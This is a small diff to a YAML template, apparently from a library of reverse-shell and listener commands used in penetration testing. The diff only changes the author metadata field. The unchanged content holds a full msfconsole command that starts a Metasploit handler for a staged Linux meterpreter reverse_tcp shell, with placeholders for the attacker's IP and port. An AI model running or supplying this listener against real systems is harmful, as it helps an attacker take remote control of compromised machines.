@@ -3,7 +3,7 @@ metadata:
   filename: "listener-msf-multi-handler-linux-x86-meterpreter-staged.yaml"
   tags: ["linux", "shell"]
   created: "2025-03-29"
-  author: "Unknown"
+  authors: ["Unknown"]
 
 content: |
   msfconsole -q -x "use exploit/multi/handler;set payload linux/x86/meterpreter/reverse_tcp;set LHOST {{ attacker_ip }};set LPORT {{ shell_port }};run;"
